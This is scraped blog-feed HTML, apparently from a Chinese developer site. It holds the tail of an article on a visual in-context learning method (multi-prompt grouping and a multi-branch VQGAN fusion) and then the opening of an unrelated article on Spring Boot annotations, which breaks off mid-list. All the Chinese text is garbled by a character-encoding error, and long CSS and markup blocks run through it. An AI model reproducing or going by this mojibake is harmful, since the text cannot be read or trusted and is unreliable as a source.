pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨äººå·¥æ™ºèƒ½é¢†åŸŸï¼Œè®©æ¨¡å‹å…·å¤‡ <strong>â€œçœ‹å‡ ä¸ªä¾‹å­å°±èƒ½å­¦ä¼šæ–°ä»»åŠ¡â€</strong> çš„èƒ½åŠ›ï¼Œä¸€ç›´æ˜¯ç ”ç©¶è€…è¿½æ±‚çš„ç›®æ ‡ã€‚è¿™ç§åœ¨è‡ªç„¶è¯­è¨€å¤„ç†ä¸­å·²è¶‹æˆç†Ÿçš„<strong>ä¸Šä¸‹æ–‡å­¦ä¹ </strong> <strong>ï¼ˆIn-Context Learningï¼‰</strong> ï¼Œå¦‚ä»Šæ­£è¢«æ·±å…¥åº”ç”¨äºè§†è§‰ä¸–ç•Œï¼Œå‚¬ç”Ÿå‡º<strong>è§†è§‰ä¸Šä¸‹æ–‡å­¦ä¹ ï¼ˆVisual In-Context Learning, VICLï¼‰</strong> ã€‚</p>
<p>ç„¶è€Œï¼Œå½“å‰ä¸»æµæ–¹æ³•å¤šéµå¾ª <strong>â€œæ£€ç´¢-æç¤ºâ€</strong> èŒƒå¼ï¼Œå¾€å¾€åªæŒ‘é€‰<strong>æœ€ç›¸ä¼¼çš„ä¸€ä¸ªç¤ºä¾‹</strong>ä½œä¸ºæŒ‡å¯¼ã€‚è¿™å¥½æ¯”å­¦ç”»æ—¶åªä¸´æ‘¹ä¸€å¹…æœ€åƒçš„ä½œå“ï¼Œå´å¿½ç•¥äº†å…¶ä»–è§†è§’ã€é£æ ¼å„å¼‚çš„ä½³ä½œï¼Œæ— å½¢ä¸­ä¸¢å¼ƒäº†å®è´µçš„å¤šæ ·æ€§ä¿¡æ¯ã€‚</p>
<p>è™½ç„¶å·²æœ‰ç ”ç©¶å°è¯•å°†å¤šä¸ªç¤ºä¾‹<strong>èåˆæˆå•ä¸€æç¤º</strong>ï¼Œä½†ç®€å•çš„èšåˆå¦‚åŒå°†å¤šç§é¢œæ–™æ··æˆä¸€è‰²ï¼Œåè€Œè®©æ¨¡å‹å¤±å»äº†åˆ†è¾¨ã€æƒè¡¡ä¸åŒçº¿ç´¢çš„æœºä¼šã€‚<strong>çœŸæ­£çš„çªç ´ï¼Œéœ€è¦ä¸€ç§æ›´ç²¾å·§çš„â€œå¤šé¢èåˆâ€æœºåˆ¶ã€‚</strong></p>
<h2 data-id="heading-0"><strong>è§†è§‰ä¸Šä¸‹æ–‡å­¦ä¹ ï¼šä»â€œå•ä¾‹æ¨¡ä»¿â€åˆ°â€œå¤šä¾‹èåˆâ€</strong></h2>
<p>è§†è§‰ä¸Šä¸‹æ–‡å­¦ä¹ çš„ç›®æ ‡ï¼Œæ˜¯è®©æ¨¡å‹ä»…é€šè¿‡è§‚å¯Ÿå‡ ä¸ªç»™å®šçš„è§†è§‰ç¤ºä¾‹ï¼Œå°±èƒ½ç†è§£å’Œå®Œæˆæ–°çš„è§†è§‰ä»»åŠ¡ã€‚ä¾‹å¦‚ï¼Œç»™å®šå‡ å¼ åˆ†å‰²å¥½çš„â€œçŒ«â€çš„å›¾ç‰‡ï¼Œæ¨¡å‹å°±èƒ½è‡ªåŠ¨å¯¹æ–°å›¾ç‰‡ä¸­çš„çŒ«è¿›è¡Œåˆ†å‰²ã€‚</p>
<p>ä¼ ç»Ÿæ–¹æ³•å¦‚ MAE-VQGAN ä½¿ç”¨å•ä¸€æœ€ç›¸ä¼¼çš„å›¾åƒ-æ ‡ç­¾å¯¹ä½œä¸ºæç¤ºã€‚åç»­ç ”ç©¶å¦‚ Prompt-Selfã€VPRã€Partial2Global ç­‰è™½åœ¨<strong>æç¤ºé€‰æ‹©ä¸æ’åº</strong>ä¸Šåšäº†ä¼˜åŒ–ï¼Œä½†ä¾ç„¶åªé€‰ä¸€ä¸ªã€‚</p>
<p>CONDENSER æ–¹æ³•è¿ˆå‡ºäº†é‡è¦ä¸€æ­¥ï¼šå®ƒå°†<strong>å‰ K ä¸ªç¤ºä¾‹èåˆæˆä¸€ä¸ª</strong>æ›´å®Œæ•´çš„æç¤ºã€‚ä½†é—®é¢˜ä¾ç„¶å­˜åœ¨â€”â€”<strong>ç®€å•å‹ç¼©ä¼šä¸¢å¤±å¤šæ ·æ€§</strong>ï¼Œæ¨¡å‹æ— æ³•å¯¹ä¸åŒæ¥æºçš„ä¿¡æ¯è¿›è¡Œæƒè¡¡ä¸æ¯”è¾ƒã€‚</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1ba7ecda9f104b7a84352004548c9c94~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769482397&amp;x-signature=8VCufYZZvi8qCzYeJ8M9xX%2BAG88%3D" alt="screenshot_2026-01-19_15-09-05.png" loading="lazy"/></p>
<h2 data-id="heading-1"><strong>æ ¸å¿ƒåˆ›æ–°ï¼šå¤šæç¤ºåˆ†ç»„é€‰æ‹©ä¸å¤šåˆ†æ”¯èåˆæ¶æ„</strong></h2>
<p>è¯¥ç ”ç©¶çš„æ ¸å¿ƒæ€è·¯æ˜¯ï¼š<strong>ä¸å‹ç¼©ï¼Œè€Œæ˜¯åä½œ</strong>ã€‚å…¶æ¡†æ¶åŒ…å«ä¸¤å¤§å…³é”®åˆ›æ–°ï¼š</p>
<ul>
<li><strong>å¤šæç¤ºåˆ†ç»„é€‰æ‹©ï¼ˆMPGSï¼‰</strong></li>
</ul>
<p>å—è§£è€¦è¡¨ç¤ºå­¦ä¹ å¯å‘ï¼Œç ”ç©¶å›¢é˜Ÿæå‡ºæ ¹æ®ç¤ºä¾‹ä¸æŸ¥è¯¢å›¾åƒçš„ç›¸ä¼¼åº¦ï¼Œå°† Top-K ä¸ªæ”¯æŒç¤ºä¾‹åˆ†ä¸ºä¸‰ç»„ï¼š</p>
<ul>
<li><strong>æ•´ä½“ç»„ï¼š</strong> åŒ…å«æ‰€æœ‰æ”¯æŒå¯¹ï¼Œæä¾›å®Œæ•´ä¸Šä¸‹æ–‡ã€‚</li>
<li><strong>é«˜ç›¸ä¼¼ç»„ï¼š</strong> ç”±æœ€ç›¸å…³çš„å‡ ä¸ªç¤ºä¾‹ç»„æˆï¼Œæä¾›ä¸æŸ¥è¯¢ç›´æ¥ç›¸å…³çš„ç»†ç²’åº¦çº¿ç´¢ã€‚</li>
<li><strong>ä½ç›¸ä¼¼ç»„ï¼š</strong> ç”±ç›¸ä¼¼åº¦è¾ƒä½çš„ç¤ºä¾‹ç»„æˆï¼Œæä¾›<strong>å¤šæ ·æ€§</strong>ä¸<strong>å¯¹æ¯”ä¿¡æ¯</strong>ï¼Œå¢å¼ºæ¨¡å‹é²æ£’æ€§ï¼Œé˜²æ­¢è¿‡æ‹Ÿåˆã€‚</li>
</ul>
<p>è¿™ç§åˆ†ç»„ç­–ç•¥æ˜¾å¼åœ°ä¿ç•™å¹¶åˆ©ç”¨äº†äº’è¡¥çš„ä¸Šä¸‹æ–‡ä¿¡æ¯ã€‚</p>
<ul>
<li><strong>å¤šåˆ†æ”¯VQGANèåˆæ¶æ„ï¼ˆMULTI-VQGANï¼‰</strong></li>
</ul>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5085777d5b4a46a4b61d8ff6e7c3e1ac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769482397&amp;x-signature=2hTlSRy9371J4bkPOgjvD9ZOcns%3D" alt="screenshot_2026-01-19_15-10-15.png" loading="lazy"/></p>
<p>ç ”ç©¶å›¢é˜Ÿè®¾è®¡äº†å…¨æ–°çš„ MULTI-VQGAN æ¶æ„æ¥å¤„ç†è¿™ä¸‰ç»„ä¿¡æ¯ã€‚å…¶æ ¸å¿ƒæ˜¯ä¸€ä¸ª<strong>å¤šåˆ†æ”¯ç¼–ç å™¨ï¼š</strong></p>
<ul>
<li><strong>ä¸»å¹²åˆ†æ”¯</strong>å¤„ç†æ•´ä½“ç»„ä¿¡æ¯ã€‚</li>
<li><strong>ä¸¤ä¸ªè¾…åŠ©åˆ†æ”¯</strong>åˆ†åˆ«å¤„ç†é«˜ã€ä½ç›¸ä¼¼ç»„ä¿¡æ¯ã€‚</li>
</ul>
<p>å…³é”®åˆ›æ–°åœ¨äº<strong>åˆ†å±‚èåˆæœºåˆ¶</strong>ã€‚åœ¨ä¸»å¹²ç½‘ç»œçš„ä¸€ç³»åˆ—ä¸­é—´å±‚ä¸­ï¼Œå¼•å…¥å¯å­¦ä¹ çš„<strong>FUSEæ¨¡å—</strong>ã€‚è¯¥æ¨¡å—åˆ©ç”¨<strong>äº¤å‰æ³¨æ„åŠ›æœºåˆ¶</strong>ï¼ŒåŠ¨æ€åœ°å°†ä¸¤ä¸ªè¾…åŠ©åˆ†æ”¯çš„å¼•å¯¼ç‰¹å¾æ•´åˆåˆ°ä¸»å¹²ç‰¹å¾ä¸­ï¼Œå®ç°å±‚æ¬¡åŒ–çš„ç‰¹å¾èåˆã€‚</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c4c3c0461b154986b231cb42bd0f2b0a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769482397&amp;x-signature=29lCqNtY61N2%2FlcQRUi%2Faa9r7rQ%3D" alt="screenshot_2026-01-19_15-10-36.png" loading="lazy"/></p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f6f5b838137a4fba9dc27a11956adf10~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769482397&amp;x-signature=l78Iq4YAvI40qZlTdy0x2iR09Lw%3D" alt="screenshot_2026-01-19_15-10-45.png" loading="lazy"/></p>
<h2 data-id="heading-2"><strong>å®éªŒæ•ˆæœï¼šå…¨é¢é¢†å…ˆï¼Œæ³›åŒ–èƒ½åŠ›å‡ºä¼—</strong></h2>
<p>ç ”ç©¶å›¢é˜Ÿåœ¨<strong>å‰æ™¯åˆ†å‰²ã€å•ç›®æ ‡æ£€æµ‹ã€å›¾åƒä¸Šè‰²</strong>ä¸‰ä¸ªä»»åŠ¡ä¸Šè¿›è¡Œäº†å…¨é¢æµ‹è¯•ã€‚</p>
<ul>
<li><strong>é‡åŒ–ç»“æœæ˜¾ä¼˜åŠ¿</strong></li>
</ul>
<p>åœ¨PASCAL-5â±æ•°æ®é›†ä¸Šçš„å®éªŒè¡¨æ˜ï¼Œè¯¥æ–¹æ³•åœ¨K=8å’ŒK=16ä¸¤ç§è®¾ç½®ä¸‹ï¼Œæ€§èƒ½å‡<strong>å…¨é¢è¶…è¶Š</strong>åŒ…æ‹¬CONDENSERåœ¨å†…çš„ç°æœ‰æ–¹æ³•ã€‚åœ¨åˆ†å‰²ä»»åŠ¡ä¸Šå®ç°äº†5.6% çš„æ˜¾è‘—æ€§èƒ½æå‡ã€‚</p>
<p>æ›´å€¼å¾—ä¸€æçš„æ˜¯å…¶<strong>å¼ºå¤§çš„è·¨åŸŸæ³›åŒ–èƒ½åŠ›</strong>ã€‚åœ¨COCO-5â±æ•°æ®é›†ä¸Šè®­ç»ƒï¼Œç„¶ååœ¨PASCAL-5â±ä¸Šæµ‹è¯•çš„æŒ‘æˆ˜æ€§è®¾ç½®ä¸­ï¼Œè¯¥æ–¹æ³•åŒæ ·è¡¨ç°æœ€ä¼˜ï¼Œè¯æ˜äº†å…¶å­¦åˆ°çš„è¡¨ç¤ºå…·æœ‰é«˜åº¦çš„å¯è¿ç§»æ€§ã€‚</p>
<ul>
<li><strong>æ¶ˆèå®éªŒéªŒçœŸç« </strong></li>
</ul>
<p>é€šè¿‡ç³»ç»Ÿçš„æ¶ˆèå®éªŒï¼Œç ”ç©¶å›¢é˜ŸéªŒè¯äº†å„ä¸ªç»„ä»¶çš„å¿…è¦æ€§ï¼š</p>
<ul>
<li>ä½¿ç”¨åŒåˆ†æ”¯ï¼ˆé«˜/ä½ç›¸ä¼¼ç»„ï¼‰æ•ˆæœæœ€ä½³ï¼Œ<strong>å•çº¯å¢åŠ åˆ†æ”¯æ•°é‡æ— ç›Šã€‚</strong></li>
<li>ç”¨æ•´ä½“ç»„ä½œä¸ºä¸»å¹²åˆ†æ”¯è‡³å…³é‡è¦ã€‚</li>
<li>FUSEæ¨¡å—ä¸­çš„<strong>ç‹¬ç«‹Q/K/VæŠ•å½±ã€äº¤å‰æ³¨æ„åŠ›ã€æ®‹å·®è¿æ¥</strong>ååŒä½œç”¨ï¼Œç¼ºä¸€ä¸å¯ã€‚</li>
<li>åœ¨ç¼–ç å™¨çš„<strong>ä¸­å±‚è¿›è¡Œèåˆ</strong>ï¼ˆå¦‚ç¬¬8è‡³14å±‚ï¼‰èƒ½æœ€å¥½åœ°å¹³è¡¡é«˜å±‚ç»“æ„æ§åˆ¶ä¸ä½å±‚ç»†èŠ‚ä¼˜åŒ–ã€‚</li>
</ul>

<ul>
<li><strong>å®šæ€§ç»“æœæ›´ç›´è§‚</strong></li>
</ul>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ab02c213a0484204b20d8a4e93e65e96~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769482397&amp;x-signature=ycsMQSOL2BldnYMOzyXzdk1Otj0%3D" alt="screenshot_2026-01-19_15-12-45.png" loading="lazy"/></p>
<p>å¯è§†åŒ–ç»“æœæ˜¾ç¤ºï¼Œè¯¥æ–¹æ³•åœ¨<strong>å¤æ‚åœºæ™¯</strong>ä¸­èƒ½æ›´å¥½åœ°ä¿æŒ<strong>ç‰©ä½“ç»“æ„çš„å®Œæ•´æ€§å’Œç»†èŠ‚çš„æ¸…æ™°åº¦</strong>ï¼Œæ£€æµ‹æ¡†æ›´ç´§è‡´å‡†ç¡®ï¼Œä¸Šè‰²æ•ˆæœæ›´è‡ªç„¶è¿è´¯ã€‚</p>
<h2 data-id="heading-3"><strong>æ€»ç»“</strong></h2>
<p>è¿™é¡¹ç ”ç©¶æ¨åŠ¨è§†è§‰ä¸Šä¸‹æ–‡å­¦ä¹ ä» <strong>â€œé€‰æ‹©æˆ–å‹ç¼©æç¤ºâ€</strong> è¿ˆå‘ <strong>â€œåä½œèåˆæç¤ºâ€</strong> Â çš„æ–°é˜¶æ®µã€‚é€šè¿‡åˆ›æ–°çš„<strong>å¤šæç¤ºåˆ†ç»„ç­–ç•¥</strong> <strong>ï¼ˆMPGSï¼‰</strong> å’Œ<strong>åˆ†å±‚å¤šåˆ†æ”¯èåˆæ¶æ„</strong> <strong>ï¼ˆMULTI-VQGANï¼‰</strong> ï¼Œæ¨¡å‹èƒ½å¤Ÿå……åˆ†åˆ©ç”¨å¤šä¸ªç¤ºä¾‹ä¸­çš„äº’è¡¥ä¿¡æ¯ï¼Œä»è€Œåšå‡ºæ›´é²æ£’ã€æ›´å‡†ç¡®çš„é¢„æµ‹ã€‚</p>
<p>å¹¿æ³›çš„å®éªŒè¯æ˜ï¼Œè¯¥æ–¹æ³•åœ¨å¤šç§ä»»åŠ¡å’Œè·¨åŸŸåœºæ™¯ä¸‹å‡å…·æœ‰ä¼˜è¶Šçš„æ³›åŒ–èƒ½åŠ›ã€‚è¿™ä¸ä»…ä¸ºè§†è§‰ä¸Šä¸‹æ–‡å­¦ä¹ æä¾›äº†æ–°æ€è·¯ï¼Œä¹Ÿä¸ºæ„å»ºæ›´é€šç”¨ã€æ›´å¼ºå¤§çš„è§†è§‰åŸºç¡€æ¨¡å‹å¥ å®šäº†åšå®åŸºç¡€ã€‚</p>
<p>æœªæ¥ï¼Œè¿™ç§ <strong>â€œå¤šé¢åä½œâ€</strong> çš„èåˆèŒƒå¼æœ‰æœ›æ‰©å±•åˆ°æ›´å¤šè§†è§‰ä¹ƒè‡³å¤šæ¨¡æ€ä»»åŠ¡ä¸­ï¼Œè®©äººå·¥æ™ºèƒ½çš„ä¸Šä¸‹æ–‡å­¦ä¹ èƒ½åŠ›æ›´æ¥è¿‘äººç±»çš„â€œä¸¾ä¸€åä¸‰â€ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¼€å‘ä¸­åå¤æŸ¥çš„ Spring Boot æ³¨è§£ï¼Œä¸€æ¬¡æ€§æ•´ç†åˆ°ä½]]></title>    <link>https://juejin.cn/post/7596906473306980402</link>    <guid>https://juejin.cn/post/7596906473306980402</guid>    <pubDate>2026-01-20T00:38:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596906473306980402" data-draft-id="7591713442400272393" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¼€å‘ä¸­åå¤æŸ¥çš„ Spring Boot æ³¨è§£ï¼Œä¸€æ¬¡æ€§æ•´ç†åˆ°ä½"/> <meta itemprop="keywords" content="Spring Boot"/> <meta itemprop="datePublished" content="2026-01-20T00:38:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é—²ç…®å…‰é˜´"/> <meta itemprop="url" content="https://juejin.cn/user/1523239911963420"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¼€å‘ä¸­åå¤æŸ¥çš„ Spring Boot æ³¨è§£ï¼Œä¸€æ¬¡æ€§æ•´ç†åˆ°ä½
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1523239911963420/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é—²ç…®å…‰é˜´
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T00:38:46.000Z" title="Tue Jan 20 2026 00:38:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»28åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ¬æ–‡ç³»ç»Ÿæ¢³ç† Spring æ¡†æ¶ä¸­å®¹å™¨ç®¡ç†å’Œ WebMVC ç›¸å…³çš„æ ¸å¿ƒæ³¨è§£ï¼Œç»“åˆä½¿ç”¨åœºæ™¯ã€å±æ€§è¯´æ˜å’Œå®æˆ˜ç¤ºä¾‹ï¼Œå¸®åŠ©å¼€å‘è€…æ·±å…¥ç†è§£æ³¨è§£çš„åº•å±‚é€»è¾‘ä¸æ­£ç¡®ç”¨æ³•ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€å®¹å™¨ç›¸å…³æ³¨è§£</h2>
<p>å®¹å™¨ç›¸å…³æ³¨è§£æ˜¯ Spring IoC å®¹å™¨å®ç° Bean å®šä¹‰ã€åŠ è½½ã€ä¾èµ–ç®¡ç†çš„æ ¸å¿ƒï¼Œå†³å®šäº† Bean çš„ç”Ÿå‘½å‘¨æœŸã€åŠ è½½æ¡ä»¶å’Œä¾èµ–å…³ç³»ã€‚</p>
<h3 data-id="heading-1">1. @Configuration</h3>
<p><code>@Configuration</code> æ˜¯ Spring 3.0 å¼•å…¥çš„æ ¸å¿ƒæ³¨è§£ï¼Œç”¨äºæ›¿ä»£ä¼ ç»Ÿ XML é…ç½®æ–‡ä»¶ï¼Œæ ‡è®°ç±»ä¸º<strong>é…ç½®ç±»</strong>ï¼Œæ˜¯ Bean å®šä¹‰çš„æ ¸å¿ƒè½½ä½“ã€‚</p>
<ul>
<li>ä½œç”¨ï¼šæ ‡æ³¨åœ¨ç±»ä¸Šï¼Œå£°æ˜è¯¥ç±»ä¸º Spring é…ç½®ç±»ï¼Œé…åˆ<code>@Bean</code>æ³¨è§£å®šä¹‰ Beanï¼›</li>
<li>ç‰¹æ€§ï¼šè¢«æ ‡æ³¨çš„ç±»æœ¬èº«ä¹Ÿä¼šè¢«æ³¨å†Œä¸º Beanï¼Œçº³å…¥ Spring å®¹å™¨ç®¡ç†ï¼›</li>
<li>åº•å±‚é€»è¾‘ï¼šé»˜è®¤æƒ…å†µä¸‹ï¼Œé…ç½®ç±»ä¼šè¢« CGLIB ä»£ç†ï¼Œä¿è¯<code>@Bean</code>æ–¹æ³•è°ƒç”¨æ—¶è¿”å›å®¹å™¨ä¸­å·²åˆå§‹åŒ–çš„å•ä¾‹ Beanï¼Œè€Œéæ–°åˆ›å»ºå®ä¾‹ã€‚</li>
</ul>
<p><strong>å±æ€§è¯´æ˜ï¼š</strong></p>




















<table><thead><tr><th>å±æ€§</th><th>è¯´æ˜</th><th>è¡¥å……è¯´æ˜</th></tr></thead><tbody><tr><td>value</td><td>Bean åç§°</td><td>å¯é€‰ï¼Œé»˜è®¤ä½¿ç”¨ç±»åé¦–å­—æ¯å°å†™ä½œä¸º Bean åç§°</td></tr><tr><td>proxyBeanMethods</td><td>æŒ‡å®š @Bean æ–¹æ³•æ˜¯å¦å¯ç”¨ CGLIB ä»£ç†</td><td>â‘  <code>true</code>ï¼ˆé»˜è®¤ï¼‰ï¼šä»£ç†æ¨¡å¼ï¼Œè°ƒç”¨ @Bean æ–¹æ³•è¿”å›å®¹å™¨ä¸­çš„ Beanï¼›â‘¡ <code>false</code>ï¼šè½»é‡æ¨¡å¼ï¼Œè°ƒç”¨ @Bean æ–¹æ³•ç›´æ¥ new æ–°å¯¹è±¡ï¼Œé€‚åˆæ— ä¾èµ–çš„ç®€å• Beanï¼Œæå‡å¯åŠ¨æ€§èƒ½</td></tr></tbody></table>
<h3 data-id="heading-2">2. @Bean</h3>
<p><code>@Bean</code> ç”¨äºåœ¨é…ç½®ç±»ä¸­æ˜¾å¼å®šä¹‰ Beanï¼Œæ˜¯ XML é…ç½®ä¸­<code>&lt;bean&gt;</code>æ ‡ç­¾çš„æ³¨è§£ç­‰ä»·å®ç°ã€‚</p>
<ul>
<li>ä½œç”¨ï¼šæ ‡æ³¨åœ¨æ–¹æ³•ä¸Šï¼Œæ–¹æ³•è¿”å›å€¼å°†è¢«æ³¨å†Œä¸º Spring å®¹å™¨ä¸­çš„ Beanï¼›</li>
<li>ä½œç”¨åŸŸï¼šæ–¹æ³•å¿…é¡»å®šä¹‰åœ¨<code>@Configuration</code>æˆ–<code>@Component</code>æ ‡æ³¨çš„ç±»ä¸­ï¼›</li>
